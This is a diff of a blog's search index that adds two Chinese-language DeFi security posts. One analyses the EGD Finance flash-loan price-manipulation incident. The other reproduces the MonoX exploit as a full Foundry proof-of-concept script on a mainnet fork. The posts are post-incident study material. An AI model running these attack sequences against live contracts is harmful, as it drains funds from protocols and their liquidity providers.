@@ -56,6 +56,110 @@
       </tags>
   </entry>
   <entry>
+    <title>EGD价格操纵攻击原理分析--phalcon+etherscan</title>
+    <url>/2023/12/19/EGD%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="EGD攻击事件相关信息"><a href="#EGD攻击事件相关信息" class="headerlink" title="EGD攻击事件相关信息"></a>EGD攻击事件相关信息</h2><p>发生在BSC上</p>
+<ul>
+<li><p>攻击者地址：<a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd">Address 0xee0221d76504aec40f63ad7e36855eebf5ea5edd | BscScan</a></p>
+</li>
+<li><p>攻击合约：<a href="https://bscscan.com/address/0xc30808d9373093fbfcec9e026457c6a9dab706a7">Contract Address 0xc30808d9373093fbfcec9e026457c6a9dab706a7 | BscScan</a></p>
+</li>
+<li><p>攻击交易：<a href="https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3">BNB Smart Chain Transaction Hash (Txhash) Details | BscScan</a></p>
+</li>
+<li><p>受害合约的地址：<a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code">EGD_Finance | Address 0x93c175439726797dcee24d08e4ac9164e88e7aee | BscScan</a></p>
+</li>
+</ul>
+<h2 id="EGD-Finance代码分析及攻击流程讲解"><a href="#EGD-Finance代码分析及攻击流程讲解" class="headerlink" title="EGD-Finance代码分析及攻击流程讲解"></a>EGD-Finance代码分析及攻击流程讲解</h2><p>EGD_Finance合约的调用都是通过代理合约进行调用</p>
+<p>在区块链浏览器上点击“Read as Proxy”可以查看到最终的合约。</p>
+<p><code>EGD Finance</code>合约中实现的主要功能就是<strong>质押USDT一段时候，可提取奖励EGD token</strong>，相当于银行存款，存一段时间之后可以提取利息。</p>
+<p>下面质押步骤和兑换奖励步骤都是攻击者真实发起的交易步骤</p>
+<h3 id="质押步骤"><a href="#质押步骤" class="headerlink" title="质押步骤"></a>质押步骤</h3><p><a href="https://bscscan.com/address/0xbc5e8602c4fba28d0efdbf3c6a52be455d9558f5">Address 0xbc5e8602c4fba28d0efdbf3c6a52be455d9558f5 | BscScan</a> 调用攻击合约的<code>stake()</code>函数进行相应的抵押操作，该地址应该也是攻击者地址，其创建了攻击合约</p>
+<p>具体交易如下：<a href="https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8">BNB Smart Chain Transaction Hash (Txhash) Details | BscScan</a></p>
+<p>我们可以在Phalcon上看到该交易的具体调用信息：</p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312191601130.png" alt="image-20231219160115062"></p>
+<p>这里进一步进行分析：</p>
+<p><a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code">EGD_Finance | Address 0x93c175439726797dcee24d08e4ac9164e88e7aee | BscScan</a>中<code>bond()</code>函数应该只是填写以下邀请人，应该跟web2一样，每个地址的邀请人和质押收益相关</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function bond(address invitor) external &#123;        </span><br><span class="line">        require(userInfo[msg.sender].invitor == address(0), &#x27;have invitor&#x27;);</span><br><span class="line">        require(userInfo[invitor].invitor != address(0) || invitor == fund, &#x27;wrong invitor&#x27;);</span><br><span class="line">        userInfo[msg.sender].invitor = invitor;</span><br><span class="line">        userInfo[invitor].refer ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来的<code>swapETHForExactTokens()</code>调用是Defi中很常见的代币交换操纵，通过地址看源码，其与uniswap_v2的对应函数一致</p>
+<p>从名称中可以看出是向通过不确定数量的ETH来换取一定数量的代币，可以确定交换的是USDT</p>
+<p>uniswap的参数列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapETHForExactTokens(</span><br><span class="line">    uint amountOut, // 交易获得的代币数量</span><br><span class="line">    address[] calldata path, // 交易路径列表</span><br><span class="line">    address to, // 交易获得的 token 发送到的地址</span><br><span class="line">    uint deadline // 过期时间</span><br><span class="line">) external virtual override payable ensure(deadline) returns (</span><br><span class="line">    uint[] memory amounts // 交易期望数量列表</span><br><span class="line">)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#readProxyContract">PancakeSwap: Router v2 | Address 0x10ed43c718714eb63d5aa57b78b54704e256024e | BscScan</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)</span><br><span class="line">    external</span><br><span class="line">    virtual</span><br><span class="line">    override</span><br><span class="line">    payable</span><br><span class="line">    ensure(deadline)</span><br><span class="line">    returns (uint[] memory amounts)</span><br><span class="line">&#123;</span><br><span class="line">	//检查是否为WETH进行交换</span><br><span class="line">    require(path[0] == WETH, &#x27;PancakeRouter: INVALID_PATH&#x27;);</span><br><span class="line">    // 从library中获知得到amountOut数量的USDT，需要多少ETH</span><br><span class="line">    amounts = PancakeLibrary.getAmountsIn(factory, amountOut, path);</span><br><span class="line">    //发给pancake的ETH必须大于所需数量</span><br><span class="line">    require(amounts[0] &lt;= msg.value, &#x27;PancakeRouter: EXCESSIVE_INPUT_AMOUNT&#x27;);</span><br><span class="line">    // 将 WETH 换成 ETH（对应phalcon的操作）</span><br><span class="line">    IWETH(WETH).deposit&#123;value: amounts[0]&#125;();</span><br><span class="line">    // 将 amounts[0] 数量的 path[0] 代币从用户账户中转移到 path[0], path[1] 的流动池</span><br><span class="line">    assert(IWETH(WETH).transfer(PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]));</span><br><span class="line">    // 按 path 列表执行交易集合，不细究了，之后再详细看uniswap-qwq</span><br><span class="line">    _swap(amounts, path, to);</span><br><span class="line">    // 返回多余的ETH</span><br><span class="line">    if (msg.value &gt; amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后调用代理合约的<code>stake()</code>函数，质押100个USDT，从Phalcon中的调用记录可看出，具体函数代码不进行分析了，主要是记录了很多相关信息，用于后续的奖励计算，可见<a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code">EGD_Finance | Address 0x93c175439726797dcee24d08e4ac9164e88e7aee | BscScan</a></p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312191624242.png" alt="image-20231219162437653"></p>
+<h3 id="兑换奖励步骤"><a href="#兑换奖励步骤" class="headerlink" title="兑换奖励步骤"></a>兑换奖励步骤</h3><p><a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd">Address 0xee0221d76504aec40f63ad7e36855eebf5ea5edd | BscScan</a>攻击者调用攻击合约的<code>harvest()</code>函数进行相应的兑换奖励，phalcon的交易分析如下图所示：</p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312191628484.png" alt="image-20231219162808682"></p>
+<p>首先调用合约的<code>calculateAll()函数</code>对用户的质押奖励进行计算，计算用户总共能得到多少收益</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function calculateReward(address addr, uint slot) public view returns (uint)&#123;</span><br><span class="line">    UserSlot memory info = userSlot[addr][slot];</span><br><span class="line">    if (info.leftQuota == 0) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    uint totalRew = (block.timestamp - info.claimTime) * info.rates;</span><br><span class="line">    if (totalRew &gt;= info.leftQuota) &#123;</span><br><span class="line">        totalRew = info.leftQuota;</span><br><span class="line">    &#125;</span><br><span class="line">    return totalRew;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随后用户就展开了闪电贷操作，</p>
+<p>先是通过<code>PancakeSwap</code>（0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae）调用<code>swap()函数</code>借到200个USDT，随后乐观转账，回调攻击合约的<code>pancakeCall()函数</code>可见之前的闪电贷分析文章。</p>
+<p>在<code>pancakecall()函数中</code>又发起闪电贷，从<code>Pancake LPs</code>（0xa361433e409adac1f87cdf133127585f8a93c67d）中调用<code>swap()函数</code>借到424456个USDT，再次回调到<code>pancakeCall()函数</code>中，这是用户调用<code>claimAllReward()函数</code>兑换自己之前质押的奖励。</p>
+<blockquote>
+<p>为什么在这里兑换奖励，应该很明显能够猜到是因为，闪电贷的大笔金额影响了奖励的计算方法，这里应该是计算质押奖励的函数出现了漏洞问题。</p>
+</blockquote>
+<p>下面去<a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#readProxyContract">PancakeSwap: Router v2 | Address 0x10ed43c718714eb63d5aa57b78b54704e256024e | BscScan</a>项目的<code>claimAllReward()</code>中看一下具体源码，进行了详细的注释：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimAllReward() external &#123;</span><br><span class="line">		//判断是否存在对应的质押</span><br><span class="line">       require(userInfo[msg.sender].userStakeList.length &gt; 0, &#x27;no stake&#x27;);</span><br><span class="line">       require(!black[msg.sender],&#x27;black&#x27;);</span><br><span class="line">       //获取质押时的，一系列质押记录，包括金额、时间戳等等</span><br><span class="line">       uint[] storage list = userInfo[msg.sender].userStakeList;</span><br><span class="line">       uint rew;</span><br><span class="line">       uint outAmount;</span><br><span class="line">       uint range = list.length;</span><br><span class="line">       //计算对应的奖励</span><br><span class="line">       for (uint i = 0; i &lt; range; i++) &#123;</span><br><span class="line">           UserSlot storage info = userSlot[msg.sender][list[i - outAmount]];</span><br><span class="line">           require(info.totalQuota != 0, &#x27;wrong index&#x27;);</span><br><span class="line">           //不能超过一个最大奖励</span><br><span class="line">           uint quota = (block.timestamp - info.claimTime) * info.rates;</span><br><span class="line">           if (quota &gt;= info.leftQuota) &#123;</span><br><span class="line">               quota = info.leftQuota;</span><br><span class="line">           &#125;</span><br><span class="line">           //关键步骤，计算对应的奖励，仔细看一下getEGDPrice()函数</span><br><span class="line">           //根据EGD的价格，来确定奖励多少EGD</span><br><span class="line">           rew += quota * 1e18 / getEGDPrice();</span><br><span class="line">           //下面是一些计算账户剩下最大奖励，以及账户余额（+利息）等操作</span><br><span class="line">           info.claimTime = block.timestamp;</span><br><span class="line">           info.leftQuota -= quota;</span><br><span class="line">           info.claimedQuota += quota;</span><br><span class="line">           if (info.leftQuota == 0) &#123;</span><br><span class="line">               userInfo[msg.sender].totalAmount -= info.totalQuota;</span><br><span class="line">               delete userSlot[msg.sender][list[i - outAmount]];</span><br><span class="line">               list[i - outAmount] = list[list.length - 1];</span><br><span class="line">               list.pop();</span><br><span class="line">               outAmount ++;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       //更新相应的质押列表</span><br><span class="line">       userInfo[msg.sender].userStakeList = list;</span><br><span class="line">       //发送响应的奖励</span><br><span class="line">       EGD.transfer(msg.sender, rew);</span><br><span class="line">       userInfo[msg.sender].totalClaimed += rew;</span><br><span class="line">       emit Claim(msg.sender,rew);</span><br><span class="line">   &#125;</span><br><span class="line">   function getEGDPrice() public view returns (uint)&#123;</span><br><span class="line">   	//可在phalcon上看到行营的记录</span><br><span class="line">       uint balance1 = EGD.balanceOf(pair);</span><br><span class="line">       uint balance2 = U.balanceOf(pair);</span><br><span class="line">       //EGD的价格仅仅是根据两种代币的实时数量（流动性）来进行计算，可以被攻击者操纵</span><br><span class="line">       return (balance2 * 1e18 / balance1);</span><br><span class="line">   &#125;</span><br><span class="line">   function initialize() public initializer &#123;</span><br><span class="line">       __Context_init_unchained();</span><br><span class="line">       __Ownable_init_unchained();</span><br><span class="line">       rate = [200, 180, 160, 140];</span><br><span class="line">       startTime = block.timestamp;</span><br><span class="line">       referRate = [6, 3, 1, 1, 1, 1, 1, 1, 2, 3];</span><br><span class="line">       rateList = [547,493,438,383];</span><br><span class="line">       dailyStakeLimit = 1000000 ether;</span><br><span class="line">       wallet = 0xC8D45fF624F698FA4E745F02518f451ec4549AE8;</span><br><span class="line">       fund = 0x9Ce3Aded1422A8c507DC64Ce1a0C759cf7A4289F;</span><br><span class="line">       EGD = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98);</span><br><span class="line">       U = IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line">       router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);</span><br><span class="line">       pair = IPancakeFactory(router.factory()).getPair(address(EGD),address(U));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>EGD的价格是根据两种代币在一个地址上的数量进行计算的，我们在<code>initialize()函数</code>中得到pair地址，pair地址是根据router地址进行计算，router为一个代理合约，在区块链浏览器上我们可以看到pair的地址为0xa361433e409adac1f87cdf133127585f8a93c67d，为pancake的一个提供流动性的合约，是不是有点眼熟。</p>
+<p>到这里我们也肯定发现了攻击为什么能成功？</p>
+<ul>
+<li>用户先通过闪电贷在<code>Pancake LPs</code>0xa361…中借走了大量的USDT，导致<code>Pancake LPs</code>中USDT与EGDpair对中，EGD的价格变得十分便宜。</li>
+<li>这时用户在<code>pancakeCall()回调函数</code>中，兑换奖励，奖励的计算是根据<code>Pancake LPs</code>中两种代币的数量进行计算EDG价格，导致EDG的价格很便宜，这是看到<code>rew</code>的计算公式，用户获得超额奖励。</li>
+</ul>
+<p>下面简单介绍一下，phalcon上后续的调用：</p>
+<p>先将<code>Pancake LPs</code>上借用的闪电贷归还；随进行了相应的k值验证（确保还款&#x3D;原款+手续费）</p>
+<p>随后在<code>PancakeSwap: WBNB-BSC-USD 2</code>借用的闪电贷，进行相应的approve授权</p>
+<p>调用swapExactTokensForTokensSupportingFeeOnTransferTokens函数将得到的EGD全部兑换成USDT</p>
+<p>随后<code>PancakeSwap: WBNB-BSC-USD 2</code>借用的闪电贷归还，并进行相应的k值验证</p>
+<p>最后攻击者获利36044 USDT</p>
+]]></content>
+      <categories>
+        <category>Defi安全</category>
+      </categories>
+      <tags>
+        <tag>Defi安全</tag>
+        <tag>安全事件分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Defi安全-Monox攻击事件Foundry复现</title>
+    <url>/2024/01/07/Defi%E5%AE%89%E5%85%A8-Monox%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6Foundry%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Mono攻击事件的介绍见：<a href="https://emmanuelwh.github.io/2023/12/23/Defi%E5%AE%89%E5%85%A8-Monox%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">Defi安全–Monox攻击事件分析–phalcon+etherscan</a></p>
+<h2 id="1-前情提要和思路介绍"><a href="#1-前情提要和思路介绍" class="headerlink" title="1. 前情提要和思路介绍"></a>1. 前情提要和思路介绍</h2><p>Monox使用单边池模型，创建的是代币-vCash交易对，添加流动性时，只需添加代币，即可进行任意代币的兑换</p>
+<p>主要的漏洞有两个方面：</p>
+<ul>
+<li>可以在Monox官网查看提供代币流动性的用户地址，但是每个用户的流动性，任意的用户都可以调用移除流动性函数，进行流动性的移除。</li>
+<li>在Monoswap的代币交换函数中，并未考虑<code>tokenIn </code> 和<code>tokenOut</code>相等的情况，代码逻辑处理的时候，出现价格覆盖的情况，Mono代币价格异常抬升，具体可见相关攻击实现的分析。</li>
+</ul>
+<h2 id="2-Foundry复现攻击流程"><a href="#2-Foundry复现攻击流程" class="headerlink" title="2. Foundry复现攻击流程"></a>2. Foundry复现攻击流程</h2><p>foundry进行外部合约调用的时候，用interface定义相应的方法，并定义对应合约的地址，实现外部合约的调用（觉得比较好的方式）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">pragma solidity &gt;=0.7.0 &lt;0.9.0;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function balanceOf(address owner) external view returns (uint256);</span><br><span class="line">    function approve(address spender, uint256 value) external returns (bool);</span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool);</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IuniswapV2pair &#123;</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IMonoswap &#123;</span><br><span class="line">    function removeLiquidity (address _token, uint256 liquidity, address to,uint256 minVcashOut, uint256 minTokenOut) external returns(uint256 vcashOut, uint256 tokenOut);</span><br><span class="line">    function addLiquidity(address _token, uint256 _amount, address to) external returns (uint256 liquidity);</span><br><span class="line">    function swapExactTokenForToken(</span><br><span class="line">        address tokenIn,</span><br><span class="line">        address tokenOut,</span><br><span class="line">        uint amountIn,</span><br><span class="line">        uint amountOutMin,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) external returns (uint amountOut);</span><br><span class="line">    function swapTokenForExactToken(</span><br><span class="line">        address tokenIn,</span><br><span class="line">        address tokenOut,</span><br><span class="line">        uint256 amountInMax,</span><br><span class="line">        uint256 amountOut,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 deadline</span><br><span class="line">    ) external returns (uint256 amountIn);</span><br><span class="line">    function pools(address)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (</span><br><span class="line">            uint256 pid,</span><br><span class="line">            uint256 lastPoolValue,</span><br><span class="line">            address token,</span><br><span class="line">            uint8 status,</span><br><span class="line">            uint112 vcashDebt,</span><br><span class="line">            uint112 vcashCredit,</span><br><span class="line">            uint112 tokenBalance,</span><br><span class="line">            uint256 price,</span><br><span class="line">            uint256 createdAt</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IMonoXPool &#123;</span><br><span class="line">    function totalSupplyOf(uint256 pid) external returns (uint256);</span><br><span class="line">    function balanceOf(address account, uint256 id) external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">address constant uniswapv2pair = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;</span><br><span class="line">address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;</span><br><span class="line">address constant Monoswap = 0xC36a7887786389405EA8DA0B87602Ae3902B88A1;</span><br><span class="line">address constant MonoXPool = 0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4;</span><br><span class="line">address constant Mono = 0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D;</span><br><span class="line">address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;</span><br><span class="line"></span><br><span class="line">address constant liquidity_user1 = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;</span><br><span class="line">address constant liquidity_user2 = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;</span><br><span class="line">address constant liquidity_user3 = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;</span><br></pre></td></tr></table></figure>
+
+<p>攻击代码</p>
+<p>调用forge进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forge test --match-contract test_Monox -vv</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401072215299.png" alt="image-20240107221535861"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract test_Monox is Test&#123;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;https://rpc.ankr.com/eth&quot;, 13_715_025);</span><br><span class="line">    &#125;</span><br><span class="line">    //首先folk以太坊上对应区块的状态</span><br><span class="line">    </span><br><span class="line">    function test_Monox_exploit() public &#123;</span><br><span class="line">        IERC20(Mono).approve(address(Monoswap), type(uint256).max);</span><br><span class="line">        IERC20(weth).deposit&#123;value: address(this).balance, gas: 40_000&#125;();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;WETH balance: &quot;, IERC20(weth).balanceOf(address(this)));</span><br><span class="line">        IERC20(weth).approve(address(Monoswap), 0.1 ether);</span><br><span class="line">		//在进行对应的代币转移的时候，一定要记得先进行approve操作</span><br><span class="line">		</span><br><span class="line">        IMonoswap(Monoswap).swapExactTokenForToken(weth, Mono, 0.1 ether, 1, address(this), 1638278872);</span><br><span class="line">        console.log(&quot;Mono balance:  &quot;, IERC20(Mono).balanceOf(address(this)));</span><br><span class="line">        //提取weth，并调用monoswap的函数，将0.1weth换成对应的Mono代币，易进行后续操作</span><br><span class="line">        </span><br><span class="line">        remove_liquidity_user();</span><br><span class="line">        uint liquidity = IMonoswap(Monoswap).addLiquidity(address(Mono), 196975656, address(this));</span><br><span class="line">        console.log(&quot;attacker gain liquidity: &quot;, liquidity);</span><br><span class="line">		//攻击者自己添加对应的流动性，获得对应LP流动性证明，为后续拉升Mono价格做准备</span><br><span class="line">		</span><br><span class="line">        raise_mono_price();</span><br><span class="line"></span><br><span class="line">        swap_mono_for_weth();</span><br><span class="line">        //将对应高价格的mono代币置换成weth</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function remove_liquidity_user() public &#123;</span><br><span class="line">        </span><br><span class="line">        (uint pid,,,,,,,,) = IMonoswap(Monoswap).pools(address(Mono));</span><br><span class="line">        uint balance = IMonoXPool(MonoXPool).totalSupplyOf(pid);</span><br><span class="line">        console.log(&quot;pid:  &quot;, pid);</span><br><span class="line">        console.log(&quot;monoXpool&#x27;s mono balance: &quot;, balance);</span><br><span class="line"></span><br><span class="line">        uint balance1 = IMonoXPool(MonoXPool).balanceOf(address(liquidity_user1), pid);</span><br><span class="line">        IMonoswap(Monoswap).removeLiquidity(address(Mono), balance1, address(liquidity_user1), 0, 1);</span><br><span class="line"></span><br><span class="line">        uint balance2 = IMonoXPool(MonoXPool).balanceOf(address(liquidity_user2), pid);</span><br><span class="line">        IMonoswap(Monoswap).removeLiquidity(address(Mono), balance2, address(liquidity_user2), 0, 1);</span><br><span class="line"></span><br><span class="line">        uint balance3 = IMonoXPool(MonoXPool).balanceOf(address(liquidity_user3), pid);</span><br><span class="line">        IMonoswap(Monoswap).removeLiquidity(address(Mono), balance3, address(liquidity_user3), 0, 1);</span><br><span class="line">		//漏洞函数，根据phalcon的调用序列，移除对应用户的流动性</span><br><span class="line">        uint balance_afterremove = IMonoXPool(MonoXPool).totalSupplyOf(pid);</span><br><span class="line">        console.log(&quot;monoXpool&#x27;s mono balance after remove liquidity&quot;, balance_afterremove);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function raise_mono_price() public &#123;</span><br><span class="line">        for(uint i = 0 ; i &lt; 55 ; i++)&#123;</span><br><span class="line">            (uint pid ,,,,,,uint tokenBalance,uint price, ) = IMonoswap(Monoswap).pools(address(Mono));</span><br><span class="line">            uint balance = IERC20(Mono).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">            IMonoswap(Monoswap).swapExactTokenForToken(address(Mono), address(Mono), tokenBalance ,0, address(this), 1638278872);</span><br><span class="line"></span><br><span class="line">            console.log(&quot;Mono token Price - &quot;,i,&quot;:  &quot;,  price);</span><br><span class="line">        &#125;</span><br><span class="line">        //按照对应的调用序列，得到池子里的Mono余额，并调用对应的漏洞函数，swapEaxctTokenForToken</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap_mono_for_weth() public &#123;</span><br><span class="line">        </span><br><span class="line">        uint weth_balance = IERC20(weth).balanceOf(address(this));</span><br><span class="line">        console.log(&quot;attacker weth balance: &quot;, weth_balance);</span><br><span class="line"></span><br><span class="line">        uint mono_balance = IERC20(Mono).balanceOf(address(this));</span><br><span class="line">        console.log(&quot;attacker mono balance: &quot;, mono_balance);</span><br><span class="line"></span><br><span class="line">        IuniswapV2pair(uniswapv2pair).swap(0, 547_206_697_433_507_365_949, address(this), &quot;0x00&quot;);</span><br><span class="line">        //闪电贷，借贷weth和usdc的pair对</span><br><span class="line">        uint weth_balance2 = IERC20(weth).balanceOf(address(this));</span><br><span class="line">        console.log(&quot;attacker weth balance: &quot;, weth_balance2 - weth_balance);</span><br><span class="line"></span><br><span class="line">        uint mono_balance2 = IERC20(Mono).balanceOf(address(this));</span><br><span class="line">        console.log(&quot;attacker mono balance: &quot;, mono_balance - mono_balance2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public&#123;</span><br><span class="line"></span><br><span class="line">        uint balance = IERC20(Mono).balanceOf(address(this));</span><br><span class="line">        IMonoswap(Monoswap).swapTokenForExactToken(address(Mono), address(usdc), balance, 4029106880396, address(this), 1638278872);</span><br><span class="line"></span><br><span class="line">        bool success = IERC20(usdc).transfer(address(uniswapv2pair),3029106880396);</span><br><span class="line"></span><br><span class="line">        require(success);</span><br><span class="line">        //在回调函数中，调用monoswap对应的函数，将mono换成对应的usdc，实现对应的usdc还款。</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external returns(bytes4)&#123;</span><br><span class="line">        bytes4 a = bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;));</span><br><span class="line">        // a = 0xf23a6e61</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">    //在添加流动性的时候，会回调对应的函数，否则会报错</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击poc如果没有定义相应的的onERC1155Received，则在流动性生成时会报错，如下图所示：</p>
+<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401072216331.png" alt="image-20240107221633674"></p>
+]]></content>
+      <categories>
+        <category>Defi安全</category>
+        <category>安全事件分析</category>
+      </categories>
+      <tags>
+        <tag>区块链安全</tag>
+        <tag>安全事件分析</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Defi安全--Monox攻击事件分析--phalcon+etherscan</title>
     <url>/2023/12/23/Defi%E5%AE%89%E5%85%A8-Monox%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="MonoX攻击事件相关信息"><a href="#MonoX攻击事件相关信息" class="headerlink" title="MonoX攻击事件相关信息"></a>MonoX攻击事件相关信息</h2><p>在Ethereum和Polygon网络都发生了，攻击手段相同，以Ethereum为例进行分析：</p>
@@ -146,77 +250,6 @@
       </tags>
   </entry>
   <entry>
-    <title>EGD价格操纵攻击原理分析--phalcon+etherscan</title>
-    <url>/2023/12/19/EGD%E4%BB%B7%E6%A0%BC%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="EGD攻击事件相关信息"><a href="#EGD攻击事件相关信息" class="headerlink" title="EGD攻击事件相关信息"></a>EGD攻击事件相关信息</h2><p>发生在BSC上</p>
-<ul>
-<li><p>攻击者地址：<a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd">Address 0xee0221d76504aec40f63ad7e36855eebf5ea5edd | BscScan</a></p>
-</li>
-<li><p>攻击合约：<a href="https://bscscan.com/address/0xc30808d9373093fbfcec9e026457c6a9dab706a7">Contract Address 0xc30808d9373093fbfcec9e026457c6a9dab706a7 | BscScan</a></p>
-</li>
-<li><p>攻击交易：<a href="https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3">BNB Smart Chain Transaction Hash (Txhash) Details | BscScan</a></p>
-</li>
-<li><p>受害合约的地址：<a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code">EGD_Finance | Address 0x93c175439726797dcee24d08e4ac9164e88e7aee | BscScan</a></p>
-</li>
-</ul>
-<h2 id="EGD-Finance代码分析及攻击流程讲解"><a href="#EGD-Finance代码分析及攻击流程讲解" class="headerlink" title="EGD-Finance代码分析及攻击流程讲解"></a>EGD-Finance代码分析及攻击流程讲解</h2><p>EGD_Finance合约的调用都是通过代理合约进行调用</p>
-<p>在区块链浏览器上点击“Read as Proxy”可以查看到最终的合约。</p>
-<p><code>EGD Finance</code>合约中实现的主要功能就是<strong>质押USDT一段时候，可提取奖励EGD token</strong>，相当于银行存款，存一段时间之后可以提取利息。</p>
